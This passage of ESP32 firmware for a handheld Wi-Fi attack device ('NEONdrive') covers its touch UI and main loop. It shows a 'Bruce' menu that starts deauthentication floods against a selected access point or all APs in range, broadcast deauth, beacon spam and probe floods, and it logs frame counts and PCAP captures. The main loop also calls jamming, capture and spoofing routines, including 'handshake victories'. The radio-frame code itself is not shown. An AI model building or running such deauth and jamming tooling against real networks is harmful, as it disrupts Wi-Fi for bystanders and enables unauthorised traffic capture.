    tft.drawString(bruceGetAttackName(), 68, 40);
  } else {
    tft.setTextColor(0x7BCF, TFT_BLACK);
    tft.drawString("STOPPED", 6, 40);
  }

  if (attacking) {
    char buf[64];
    snprintf(buf, sizeof(buf), "F:%-6lu FPS:%.0f  T:%lus",
             (unsigned long)stats.framesSent,
             stats.framesPerSecond,
             (unsigned long)(stats.elapsedMs / 1000));
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString(buf, 6, 52);
  }

  // --- Scrolling log box ---
  const int boxY = 66;
  const int btnAreaH = 44;
  const int boxH = h - boxY - btnAreaH;
  const int lineH = 14;
  int visLines = boxH / lineH;
  if (visLines > MONITOR_MAX_LINES) visLines = MONITOR_MAX_LINES;

  tft.drawRect(0, boxY, w, boxH, 0x2945);

  int startIdx = 0;
  if (monitorLineCount > visLines) startIdx = monitorLineCount - visLines;
  for (int i = 0; i < visLines; i++) {
    int idx = startIdx + i;
    if (idx >= monitorLineCount) break;
    int row = idx % MONITOR_MAX_LINES;
    tft.setTextColor(monitorLines[row].color, TFT_BLACK);
    tft.drawString(monitorLines[row].text, 4, boxY + 2 + i * lineH);

  }

  // Spinner (only while attacking)
  if (attacking) {
    static uint8_t sp = 0;
    const char* spinFrames[] = {"|", "/", "-", "\\"};
    sp = (sp + 1) & 3;
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(spinFrames[sp], w - 16, boxY + boxH - 14);
  }

  // --- Buttons ---
  int btnY = h - btnAreaH + 4;
  int btnH2 = btnAreaH - 8;
  int stopW = (w - 24) * 2 / 3;
  int fileW = (w - 24) - stopW;

  btnBruceMonBack  = {8,          btnY, stopW, btnH2, attacking ? "STOP" : "BACK"};
  btnBruceMonFiles = {8 + stopW + 8, btnY, fileW, btnH2, "FILES"};

  drawButton(btnBruceMonBack,  TFT_BLACK, attacking ? TFT_RED   : 0x0380, TFT_WHITE);
  drawButton(btnBruceMonFiles, TFT_BLACK, TFT_NAVY, TFT_WHITE);

  drawBorder();
}

// ============================================================
//  Bruce Monitor tick (runs every 500 ms from loop())
// ============================================================
static void bruceMonitorTick() {
  if (screen != ScreenId::BRUCE_MONITOR) return;
  uint32_t now = millis();
  
  // Drain PCAP queue every 50ms to prevent overflow
  if (now - bruceMonLastUpdateMs >= 50) {
    bruceMonLastUpdateMs = now;
    bruceDrainPcapQueue();
  }

  bool attacking = bruceIsAttacking();
  
  // Update content only when needed (attacking, or state changed, or new lines added)
  bool shouldUpdate = false;
  
  // Check if attack state changed (attacking -> stopped or vice versa)
  if (attacking != bruceMonLastAttackingState) {
    bruceMonLastAttackingState = attacking;
    shouldUpdate = true;
  }
  
  // Check if new content added to terminal
  if (monitorLineCount != bruceMonLastLineCount) {
    bruceMonLastLineCount = monitorLineCount;
    shouldUpdate = true;
  }
  
  // If attacking, add periodic stats (every 500ms max)
  static uint32_t lastStatsMs = 0;
  if (attacking && now - lastStatsMs >= 500) {
    lastStatsMs = now;
    BruceStats stats = bruceGetStats();
    BruceAttackType attackType = bruceGetCurrentAttackType();
    
    // Build contextual description based on attack type
    const char* description = "";
    switch (attackType) {
      case BruceAttackType::DEAUTH_FLOOD:
        description = "Deauth Flood";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)brucePcapFrameCount);
        break;
      case BruceAttackType::BEACON_SPAM:
        description = "Beacon Spam";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)brucePcapFrameCount);
        break;
      case BruceAttackType::PROBE_FLOOD:
        description = "Probe Flood";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)brucePcapFrameCount);
        break;
      case BruceAttackType::DEAUTH_BROADCAST:
        description = "Broadcast Deauth";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)brucePcapFrameCount);
        break;
      default:
        description = bruceGetAttackName();
        monitorPushLine(TFT_CYAN,
                        "%s: F:%lu fps:%.0f PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)brucePcapFrameCount);
    }
    
    Serial.printf("[BRUCE] %s | F:%lu FPS:%.1f PCAP:%lu T:%lus\n",
                  description,
                  (unsigned long)stats.framesSent,
                  stats.framesPerSecond,
                  (unsigned long)brucePcapFrameCount,
                  (unsigned long)(stats.elapsedMs / 1000));
    
    shouldUpdate = true;
  }

  // Handle attack completion
  if (!attacking && !bruceCaptureWasClosed) {
    BruceStats stats = bruceGetStats();
    BruceAttackType attackType = bruceGetCurrentAttackType();
    bruceCloseCaptures();
    
    monitorPushLine(TFT_GREEN, "== ATTACK COMPLETE ==");
    monitorPushLine(TFT_WHITE, "Type: %s", bruceGetAttackName());
    monitorPushLine(TFT_WHITE, "Frames: %lu | Time: %lu s", 
                    (unsigned long)stats.framesSent,
                    (unsigned long)(stats.elapsedMs / 1000));
    
    // Show captures
    if (brucePcapFrameCount > 0)
      monitorPushLine(TFT_CYAN, "PCAP: %lu frames captured", (unsigned long)brucePcapFrameCount);
    if (brucePcapPath[0])
      monitorPushLine(TFT_CYAN, "File: %s", brucePcapPath);
    if (bruceSessionLogPath[0])
      monitorPushLine(TFT_CYAN, "Log : %s", bruceSessionLogPath);
    
    Serial.printf("[BRUCE] %s complete. F=%lu T=%lus PCAP=%lu\n",
                  bruceGetAttackName(),
                  (unsigned long)stats.framesSent,
                  (unsigned long)(stats.elapsedMs / 1000),
                  (unsigned long)brucePcapFrameCount);
    shouldUpdate = true;
  }

  // Redraw only if something actually changed
  if (shouldUpdate) {
    drawBruceMonitorTerminal();
  }
}

// Forward declare setScreen because it is defined further down in this file.
static void setScreen(ScreenId next);

// Tick handler for Bruce Set Target screen
static void bruceSetTargetTick_UI(int tx, int ty) {
  if (screen != ScreenId::BRUCE_SET_TARGET) return;

  const int visibleNetworks = max(1, bruceTargetListItemsPerScreen - 1);
  int maxScroll = apCount - visibleNetworks;
  if (maxScroll < 0) maxScroll = 0;
  bruceTargetScroll = clampi(bruceTargetScroll, 0, maxScroll);

  if (hit(btnBruceSetTargetUp, tx, ty)) {
    if (bruceTargetScroll > 0) {
      bruceTargetScroll--;
      drawBruceSetTarget();
    }
    waitTouchRelease();
    return;
  }

  if (hit(btnBruceSetTargetDown, tx, ty)) {
    if (bruceTargetScroll < maxScroll) {
      bruceTargetScroll++;
      drawBruceSetTarget();
    }
    waitTouchRelease();
    return;
  }

  // Check "Attack All" option
  if (hit(btnBruceSetTargetAll, tx, ty)) {
    Serial.println("[BRUCE] Attack All APs selected");
    bruceTargetSsid[0] = '\0';  // Mark as all APs
    apSelected = -1;
    bruceHasSelectedTarget = true;
    setScreen(ScreenId::BRUCE_MENU);
    waitTouchRelease();
    return;
  }

  // Check network rows
  for (int row = 0; row < visibleNetworks; row++) {
    const int i = bruceTargetScroll + row;
    if (i < 0 || i >= apCount) continue;
    if (!hit(btnBruceSetTargetRows[row], tx, ty)) continue;

    // Selected this network
    apSelected = i;
    bruceTargetChannel = aps[i].channel;
    strncpy(bruceTargetSsid, aps[i].ssid.c_str(), 19);
    bruceTargetSsid[19] = '\0';
    // Convert BSSID string to bytes
    String bssidStr = aps[i].bssid;
    if (macFromString(bssidStr.c_str(), bruceTargetBssid)) {
      bruceHasSelectedTarget = true;
      Serial.printf("[BRUCE] Selected target: %s [CH%d]\n",
                    bruceTargetSsid, bruceTargetChannel);
    }
    setScreen(ScreenId::BRUCE_MENU);
    waitTouchRelease();
    return;
  }

  // Legacy rectangular hit fallback for full row area.
  if (tx >= bruceTargetListX && tx < (bruceTargetListX + bruceTargetListW) &&
      ty >= bruceTargetListTopY + bruceTargetListItemH) {
    int row = (ty - (bruceTargetListTopY + bruceTargetListItemH)) / bruceTargetListItemH;
    const int i = bruceTargetScroll + row;
    if (row >= 0 && row < visibleNetworks && i >= 0 && i < apCount) {
      apSelected = i;
      bruceTargetChannel = aps[i].channel;
      strncpy(bruceTargetSsid, aps[i].ssid.c_str(), 19);
      bruceTargetSsid[19] = '\0';
      // Convert BSSID string to bytes
      String bssidStr = aps[i].bssid;
      if (macFromString(bssidStr.c_str(), bruceTargetBssid)) {
        bruceHasSelectedTarget = true;
        Serial.printf("[BRUCE] Selected target: %s [CH%d]\n",
                      bruceTargetSsid, bruceTargetChannel);
      }
      setScreen(ScreenId::BRUCE_MENU);
      waitTouchRelease();
      return;
    }
  }

  // Check Back button
  if (hit(btnBruceSetTargetBack, tx, ty)) {
    Serial.println("[BRUCE] Back from Set Target");
    setScreen(ScreenId::BRUCE_MENU);
    waitTouchRelease();
    return;
  }

  waitTouchRelease();
}

static void bruceMenuTick_UI(int tx, int ty) {
  if (screen != ScreenId::BRUCE_MENU) return;

  if (bruceIsAttacking()) {
    // Only allow STOP button when attacking
    if (hit(bruceMenuBtns[5], tx, ty)) {
      Serial.println("[BRUCE] STOP ATTACK pressed");
      bruceStopAttack();
      drawBruceMenu();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // Check Set Target button
  if (hit(bruceMenuBtns[4], tx, ty)) {
    Serial.println("[BRUCE] Set Target pressed");
    setScreen(ScreenId::BRUCE_SET_TARGET);
    waitTouchRelease();
    return;
  }

  // Check Back button
  if (hit(bruceMenuBtns[5], tx, ty)) {
    Serial.println("[BRUCE] Back to Home");
    setScreen(ScreenId::HOME);
    waitTouchRelease();
    return;
  }

  // Check if we have a target before allowing attacks
  if (!bruceHasSelectedTarget) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("Error");
    const bool compact = (tft.height() <= 180);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("No target selected!", 10, compact ? 72 : 100);
    tft.drawString("Press 'Set Target' first", 10, compact ? 88 : 120);
    delay(2000);
    drawBruceMenu();
    waitTouchRelease();
    return;
  }

  // Attack button handlers
  // DEAUTH FLOOD
  if (hit(bruceMenuBtns[0], tx, ty)) {
    Serial.println("[BRUCE] Deauth Flood pressed");
    if (bruceTargetSsid[0] == '\0') {
      // Attack all - use a default channel
      uint8_t ch = 6;
      bruceStartDeauthBroadcast(ch, 30000);
    } else {
      BruceTarget bt;
      memcpy(bt.bssid, bruceTargetBssid, 6);
      strncpy(bt.ssid, bruceTargetSsid, 23);
      bt.channel = bruceTargetChannel;
      bruceStartDeauthFlood(bt, 30000);
    }
    setScreen(ScreenId::BRUCE_MONITOR);
    waitTouchRelease();
    return;
  }

  // BEACON SPAM
  if (hit(bruceMenuBtns[1], tx, ty)) {
    Serial.println("[BRUCE] Beacon Spam pressed");
    if (bruceTargetSsid[0] == '\0') {
      bruceStartBeaconSpam("freeWifi", 6, 20000, nullptr);
    } else {
      BruceTarget bt;
      memcpy(bt.bssid, bruceTargetBssid, 6);
      strncpy(bt.ssid, bruceTargetSsid, 23);
      bt.channel = bruceTargetChannel;
      bruceStartBeaconSpam(bt.ssid, bt.channel, 20000, &bt);
    }
    setScreen(ScreenId::BRUCE_MONITOR);
    waitTouchRelease();
    return;
  }

  // PROBE FLOOD
  if (hit(bruceMenuBtns[2], tx, ty)) {
    Serial.println("[BRUCE] Probe Flood pressed");
    const char* ssid = (bruceTargetSsid[0] != '\0') ? bruceTargetSsid : "unknown";
    uint8_t ch = (bruceTargetSsid[0] != '\0') ? bruceTargetChannel : 6;
    bruceStartProbeFlood(ssid, ch, 20000);
    setScreen(ScreenId::BRUCE_MONITOR);
    waitTouchRelease();
    return;
  }

  // DEAUTH ALL (broadcast to all devices)
  if (hit(bruceMenuBtns[3], tx, ty)) {
    Serial.println("[BRUCE] Deauth All pressed");
    uint8_t ch = (bruceTargetSsid[0] != '\0') ? bruceTargetChannel : 6;
    bruceStartDeauthBroadcast(ch, 25000);
    setScreen(ScreenId::BRUCE_MONITOR);
    waitTouchRelease();
    return;
  }

  waitTouchRelease();
}

static void drawAbout() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("About / Debug");
  drawUniversalBackground();
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();
  const bool compact = (tft.height() <= 180);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(compact ? 1 : 2);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  #if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  tft.drawString("NEONdrive T-Display-S3", content.x + 2, content.y + 8);
  #elif defined(NEONDRIVE_TARGET_TEMBED)
  tft.drawString("NEONdrive T-Embed-CC1101", content.x + 2, content.y + 8);
  #else
  tft.drawString("NEONdrive CYD", content.x + 2, content.y + 8);
  #endif

  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  #if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  tft.drawString("ESP32-S3 | 320x170 landscape UI", content.x + 2, content.y + (compact ? 24 : 40));
  tft.drawString("Touch:auto-detect + BTN1/BTN2 nav", content.x + 2, content.y + (compact ? 36 : 56));
  #elif defined(NEONDRIVE_TARGET_TEMBED)
  tft.drawString("ESP32-S3 | 320x170 landscape UI", content.x + 2, content.y + (compact ? 24 : 40));
  tft.drawString("Encoder wheel + keys navigation", content.x + 2, content.y + (compact ? 36 : 56));
  #else
  tft.drawString("Landscape USB-right | Touch PRESET #5 baked", content.x + 2, content.y + (compact ? 24 : 40));
  tft.drawString("Config: LittleFS /config.json", content.x + 2, content.y + (compact ? 36 : 56));
  #endif

  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  char dims[48];
  snprintf(dims, sizeof(dims), "tft: %dx%d", tft.width(), tft.height());
  tft.drawString(dims, content.x + 2, content.y + (compact ? 48 : 74));

  btnBack = {bottom.x, bottom.y, compact ? 92 : 120, UI_BUTTON_H, "Back"};
  drawButton(btnBack, TFT_NAVY, TFT_WHITE, TFT_WHITE);

  printConfigSerial(cfg);
  uiLogLayout("drawAbout", content, bottom);
  uiLogButtonRect("About.Back", btnBack);
  drawBorder();
}

static void setScreen(ScreenId next) {
  screen = next;
  if (verboseSerial) {
    Serial.printf("[ui] screen -> %s\n", screenToStr(screen));
  }
  switch (screen) {
    case ScreenId::HOME:              drawHome(); break;
    case ScreenId::JUST_GO:
      if (!justGoActive) {
        justGoStart();  // Auto-start automation when entering screen
      }
      drawJustGo();
      break;
    case ScreenId::CONFIG:            drawConfig(); break;
    case ScreenId::WIFI_CONFIG:       drawWifiConfig(); break;
    case ScreenId::STARTUP_CONFIG:    drawStartupConfig(); break;
    case ScreenId::TELEMETRY_CONFIG:  drawTelemetryConfig(); break;
    case ScreenId::WIFI_CONNECT:      drawWifiConnect(); break;
    case ScreenId::WEBSERVER:         drawWebserver(); break;
    case ScreenId::MONITOR:           monitorReset(); drawMonitor(); break;
    case ScreenId::ABOUT:             drawAbout(); break;
    case ScreenId::WIFI_SCAN:         drawWifiScan(); break;
    case ScreenId::CONFIRM_TARGET:    drawConfirmTarget(); break;
    case ScreenId::TARGET_DETAILS:    drawTargetDetails(); break;
    case ScreenId::AUTOMATE_MENU:     drawAutomateMenu(); break;
    case ScreenId::RECON:
      reconLayoutDrawn = false;
      reconLastLogCount = 0;
      reconLastTotalEvents = 0;
      drawRecon();
      break;
    case ScreenId::BRUCE_MENU:        drawBruceMenu(); break;
    case ScreenId::BRUCE_SET_TARGET:  bruceTargetScroll = 0; drawBruceSetTarget(); break;
    case ScreenId::SCOPE_GRAPH:
      scopeLayoutDrawn = false;
      scopeResetWaterfall();
      drawScopeGraph();
      break;
    case ScreenId::LED_CONTROL:       drawLedControl(); break;
    case ScreenId::BRUCE_MONITOR: {
      monitorLineCount = 0;
      monitorPushLine(TFT_CYAN,   "BRUCE MONITOR ONLINE");
      monitorPushLine(TFT_YELLOW, "Attack: %s", bruceGetAttackName());
      // Show target information
      if (bruceTargetSsid[0] == '\0') {
        monitorPushLine(TFT_CYAN, "Target: ALL APs in Area");
      } else {
        monitorPushLine(TFT_CYAN, "Target: %s [CH%d]",
                       bruceTargetSsid,
                        bruceTargetChannel);
      }
      bruceMonLastUpdateMs = 0;
      bruceMonLastDrawMs = 0;
      bruceMonLastLineCount = monitorLineCount;
      bruceMonLastAttackingState = bruceIsAttacking();
      bruceOpenCaptures();
      drawBruceMonitorFull();
      break;
    }
    case ScreenId::TARGETS_PLACEHOLDER: drawPlaceholder("Targets", "Coming soon"); break;
  }
#if UI_DEBUG_MEM
  char memTag[48];
  snprintf(memTag, sizeof(memTag), "screen:%s", screenToStr(screen));
  uiMemLog(memTag);
#endif
}

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static void tdisplayRedrawCurrentScreen() {
  switch (screen) {
    case ScreenId::HOME:                drawHome(); break;
    case ScreenId::JUST_GO:             drawJustGo(); break;
    case ScreenId::WIFI_SCAN:           drawWifiScan(); break;
    case ScreenId::CONFIRM_TARGET:      drawConfirmTarget(); break;
    case ScreenId::TARGET_DETAILS:      drawTargetDetails(); break;
    case ScreenId::AUTOMATE_MENU:       drawAutomateMenu(); break;
    case ScreenId::MONITOR:             drawMonitor(); break;
    case ScreenId::TARGETS_PLACEHOLDER: drawPlaceholder("Targets", "Coming soon"); break;
    case ScreenId::CONFIG:              drawConfig(); break;
    case ScreenId::WIFI_CONFIG:         drawWifiConfig(); break;
    case ScreenId::STARTUP_CONFIG:      drawStartupConfig(); break;
    case ScreenId::TELEMETRY_CONFIG:    drawTelemetryConfig(); break;
    case ScreenId::WIFI_CONNECT:        drawWifiConnect(); break;
    case ScreenId::WEBSERVER:           drawWebserver(); break;
    case ScreenId::RECON:               drawRecon(); break;
    case ScreenId::ABOUT:               drawAbout(); break;
    case ScreenId::BRUCE_MENU:          drawBruceMenu(); break;
    case ScreenId::BRUCE_MONITOR:       drawBruceMonitor(); break;
    case ScreenId::BRUCE_SET_TARGET:    drawBruceSetTarget(); break;
    case ScreenId::SCOPE_GRAPH:         drawScopeGraph(); break;
    case ScreenId::LED_CONTROL:         drawLedControl(); break;
  }
}
#endif

// ---------- Setup / Loop ----------
static void bumpInt(int& v, int delta, int lo, int hi) { v = clampi(v + delta, lo, hi); }

void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.println();
  #if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  Serial.println("=== NEONDRIVE // T-Display-S3 | Milestone D ===");
  #elif defined(NEONDRIVE_TARGET_TEMBED)
  Serial.println("=== NEONDRIVE // T-EMBED-CC1101 | Milestone D ===");
  #else
  Serial.println("=== NEONDRIVE // CYD | Milestone D ===");
  #endif

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  if (PIN_NAV_NEXT >= 0) pinMode(PIN_NAV_NEXT, INPUT_PULLUP);
  if (PIN_NAV_SELECT >= 0) pinMode(PIN_NAV_SELECT, INPUT_PULLUP);
  if (PIN_ENCODER_A >= 0) pinMode(PIN_ENCODER_A, INPUT_PULLUP);
  if (PIN_ENCODER_B >= 0) pinMode(PIN_ENCODER_B, INPUT_PULLUP);
#endif

  backlightBringup();

  // 1) SPI begin (CYD uses SPI TFT, T-Display-S3 uses 8-bit parallel TFT)
  if (TFT_USES_SPI_BUS) {
    SPI.begin(PIN_TFT_SCLK, PIN_TFT_MISO, PIN_TFT_MOSI, PIN_TFT_CS);
  }

  // 2) TFT init (LOCKED)
  tft.init();

  // 3) Landscape (LOCKED)
  tft.setRotation(1);

  // 4) Inversion ON (LOCKED)
  tft.invertDisplay(true);

  // 5) Runtime dims after rotation
  tft.fillScreen(TFT_BLACK);
  drawBorder();

  Serial.print("tft.width()=");  Serial.print(tft.width());
  Serial.print(" tft.height()="); Serial.println(tft.height());

  // Touch init (CYD only)
#if defined(NEONDRIVE_TARGET_TDISPLAY_S3_TOUCH)
  if (!tdisplayTouchInit()) {
    Serial.println("[touch] no supported touch controller detected; BUTTON_1/BUTTON_2 only");
  } else {
    Serial.println("[touch] touch enabled + BUTTON_1/BUTTON_2 fallback enabled");
  }
#elif defined(NEONDRIVE_TARGET_TEMBED)
  Serial.println("[input] encoder + button navigation enabled (no touch)");
#else
  ts.begin();
  ts.setRotation(0);
#endif

  // LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("[fs] LittleFS begin failed (even after format).");
  } else {
    Serial.println("[fs] LittleFS mounted.");
  }

  // SD (optional but required for PCAP capture files)
  mountSdCard(true);

  // Create mutex for serializing WiFi driver ops
  wifiOpMutex = xSemaphoreCreateMutex();
  if (!wifiOpMutex) {
    Serial.println("[wifi] failed to create wifiOpMutex");
  }

  // Config load or defaults
  AppConfig temp;
  applyDefaults(temp);
  bool ok = loadConfig(temp);
  if (!ok) {
    Serial.println("[cfg] using defaults and writing new config.json");
    saveConfig(temp);
  }
  cfg = temp;
  applyBacklightLevel(255);
  applyStatusLedState(ledBrightness, ledRed, ledGreen, ledBlue);
  verboseSerial = cfg.telemetry_verboseSerial;
  printConfigSerial(cfg);
  Serial.println("[dbg] monitor commands: 'v' toggle verbose, 's' status snapshot");
  bruceInit();

  // Initialize Deauth Hunter
  DeauthHunter::init();
  Serial.println("[hunter] Deauth Hunter initialized");
  uiMemLog("boot_after_init");
  uiMemBudgetBoot();

  if (cfg.startup_autoReconnectPrompt && !cfg.wifi_ssid.isEmpty()) {
    homeReconnectPromptActive = true;
  }
  setScreen(ScreenId::HOME);
  uiMemLog("after_ui_init");
  pushConsoleEvent("INFO", "SYS", "Firmware boot complete");
}

void loop() {
  handleSerialDebugCommands();
  bruceMenuTick();
  
  // Update LED flash state (for handshake victories)
  updateLEDFlash();

  // Background stats update (keeps HUD alive even without touches)
  updateSniffStats();
  rawCaptureTick();
  // perform periodic auto-mode activities
  jammitModeTick();
  yoinkModeTick();
  justGoTick();
  
  // Refresh Just Go display when active if console has new content or state changed
  if (screen == ScreenId::JUST_GO) {
    // Check if console buffer has new lines or mode changed
    if (monitorLineCount != justGoLastConsoleLineCount || justGoMode != justGoLastMode) {
      drawJustGo();
      justGoLastConsoleLineCount = monitorLineCount;
    }
  }
  
  hypercubeAnimTick();
  monitorTick();
  scopeTick();
  reconTick();
  bruceMonitorTick();
  verboseHeartbeatTick();

  // WiFi connection status updates
  if (wifiConnectInProgress) {
    updateWifiConnectStatus();
  }
  wifiConnectScanTick();
  
  // Handle WebServer requests
  if (webServerRunning) {
    webServer.handleClient();
  }

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
  if (tdisplayNavConsumeRefreshRequest()) {
    tdisplayRedrawCurrentScreen();
  }
#endif

  int tx, ty;
  if (!touchEdgeTriggered(tx, ty)) { delay(5); return; }
  if (verboseSerial) {
    Serial.printf("[touch] screen=%s x=%d y=%d\n", screenToStr(screen), tx, ty);
  }
  UI_LOGF("[ui-touch] screen=%s raw=(%d,%d,%d) mapped=(%d,%d)\n",
          screenToStr(screen),
          g_lastTouchRawX, g_lastTouchRawY, g_lastTouchRawZ,
          tx, ty);

  // HOME
  if (screen == ScreenId::HOME) {
    if (homeReconnectPromptActive) {
      if (hit(btnHomePromptNo, tx, ty)) {
        homeReconnectPromptActive = false;
        drawHome();
        waitTouchRelease();
        return;
      }
      if (hit(btnHomePromptYes, tx, ty)) {
        homeReconnectPromptActive = false;
        wifiConnectStatus = "Reconnecting to: " + cfg.wifi_ssid;
        wifiConnectSelectedIdx = -1;
        wifiConnectShowPasswordModal = false;
        setScreen(ScreenId::WIFI_CONNECT);
        connectToWifi(cfg.wifi_ssid, cfg.wifi_password);
        drawWifiConnect();
        waitTouchRelease();
        return;
      }
      waitTouchRelease();
      return;
    }

    // Targets scan prompt modal
    if (homeTargetsPromptActive) {
      if (hit(btnHomePromptNo, tx, ty)) {
        homeTargetsPromptActive = false;
        drawHome();
        resetTouchLatch();
        return;
      }
      if (hit(btnHomePromptYes, tx, ty)) {
        homeTargetsPromptActive = false;

        // Jump to WiFi scan; scanning is manual via Scan button.
        setScreen(ScreenId::WIFI_SCAN);
        wifiIsScanning = false;
        drawWifiScan();
        waitTouchRelease();
        return;
      }

      // Ignore other touches
      waitTouchRelease();
      return;
    }

    for (int i = 0; i < HOME_BTN_COUNT; ++i) {
      if (homeBtns[i].label == nullptr || homeBtns[i].label[0] == '\0') continue;
      if (!hit(homeBtns[i], tx, ty)) continue;
      switch (i) {
        case 0:
          setScreen(ScreenId::JUST_GO);
          break;
        case 1:
          setScreen(ScreenId::WIFI_SCAN);
          break;
        case 2:
          monitorMode = MonitorMode::FILES;
          monitorReturnScreen = ScreenId::HOME;
          monitorLoadFileDir("/");
          setScreen(ScreenId::MONITOR);
          break;
        case 3:
          homeTargetsPromptActive = false;
          lockChannel = cfg.wifi_defaultLockChannel;
          setScreen(ScreenId::TARGET_DETAILS);
          break;
        case 4:
          setScreen(ScreenId::RECON);
          break;
        case 5:
          setScreen(ScreenId::CONFIG);
          break;
        case 6:
          setScreen(ScreenId::ABOUT);
          break;
        case 7:
          Serial.println("[ui] Home -> BRUCE_MENU");
          setScreen(ScreenId::BRUCE_MENU);
          break;
        default:
          // if more buttons are added later, handle them here
          break;
      }
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // JUST GO
  if (screen == ScreenId::JUST_GO) {
    if (hit(btnJustGoBack, tx, ty)) {
      if (justGoActive) justGoStop();
      setScreen(ScreenId::HOME);
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoToggle, tx, ty)) {
      if (justGoActive) justGoStop();
      else justGoStart();
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoSpray, tx, ty)) {
      justGoSprayPray = !justGoSprayPray;
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoStayMinus, tx, ty)) {
      if (justGoStayMinutes > 1) justGoStayMinutes--;
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoStayPlus, tx, ty)) {
      if (justGoStayMinutes < 15) justGoStayMinutes++;
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoProfilePrev, tx, ty)) {
      if ((int)justGoProfile > 0) {
        justGoProfile = (JustGoProfile)((int)justGoProfile - 1);
      } else {
        justGoProfile = JustGoProfile::CHAOS;  // Wrap around
      }
      updateSpoofModeFromProfile();  // Update spoofing mode when profile changes
      drawJustGo();
      waitTouchRelease();
      return;
    }
    if (hit(btnJustGoProfileNext, tx, ty)) {
      if ((int)justGoProfile < 3) {
        justGoProfile = (JustGoProfile)((int)justGoProfile + 1);
      } else {
        justGoProfile = JustGoProfile::STANDARD;  // Wrap around
      }
      updateSpoofModeFromProfile();  // Update spoofing mode when profile changes
      drawJustGo();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  
  // WIFI SCAN (Milestone C)
  if (screen == ScreenId::WIFI_SCAN) {
    const int w = tft.width();
    const int wifiListXLocal = 8;
    const int wifiListWLocal = max(120, hypercubeBoxX - wifiListXLocal);

    // Buttons
    if (hit(btnWifiBack, tx, ty)) { setScreen(ScreenId::HOME); waitTouchRelease(); return; }

    if (hit(btnWifiScan, tx, ty)) {
      // show scanning status immediately
      wifiIsScanning = true;
      drawWifiScan();
      waitTouchRelease();

      // blocking scan (simple + reliable)
      doWifiScanBlocking();

      // Keep selected index valid after new list
      if (apSelected >= apCount) apSelected = -1;
      drawWifiScan();
      return;
    }

    if (hit(btnWifiStop, tx, ty)) {
      // For blocking scan, stop just clears state.
      WiFi.scanDelete();
      wifiIsScanning = false;
      Serial.println("[wifi] stop (cleared scan state)");
      drawWifiScan();
      resetTouchLatch();
      return;
    }

    // Scroll buttons
    const int maxRows = min(4, (wifiListBottomY - wifiListTopY) / wifiRowH);
    const int maxScroll = (apCount > maxRows) ? (apCount - maxRows) : 0;

    if (hit(btnWifiUp, tx, ty)) {
      apScroll = clampi(apScroll - 1, 0, maxScroll);
      drawWifiScan();
      resetTouchLatch();
      return;
    }
    if (hit(btnWifiDown, tx, ty)) {
      apScroll = clampi(apScroll + 1, 0, maxScroll);
      drawWifiScan();
      resetTouchLatch();
      return;
    }

    // Tap-to-select row
    if (tx >= wifiListXLocal && tx < (wifiListXLocal + wifiListWLocal) && ty >= wifiListTopY && ty < wifiListBottomY) {
      int row = (ty - wifiListTopY) / wifiRowH;
      int idx = apScroll + row;
      if (idx >= 0 && idx < apCount) {
        apSelected = idx;
        hasTarget = true;
        target = aps[apSelected];
        const ApRecord& a = target;
        Serial.printf("[wifi] pending target: ssid='%s' bssid=%s ch=%d rssi=%d auth=%s\n",
                      a.ssid.c_str(), a.bssid.c_str(), a.channel, a.rssi, authToStr(a.auth));
        // Show confirmation popup instead of jumping directly
        setScreen(ScreenId::CONFIRM_TARGET);
      }
      waitTouchRelease();
      return;
    }

    waitTouchRelease();
    return;
  }

// CONFIRM_TARGET: Confirmation popup before opening Target Ops
  if (screen == ScreenId::CONFIRM_TARGET) {
    if (btnWifiYes.w == 0) layoutHome();  // Initialize buttons if needed
    
    if (hit(btnWifiYes, tx, ty)) {
      // User confirmed - proceed to Target Ops
      lockChannel = cfg.wifi_defaultLockChannel;
      setScreen(ScreenId::TARGET_DETAILS);
      waitTouchRelease();
      return;
    }
    if (hit(btnWifiNo, tx, ty)) {
      // User canceled - go back to WiFi scan
      setScreen(ScreenId::WIFI_SCAN);
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

// TARGET_DETAILS: Main target operations screen
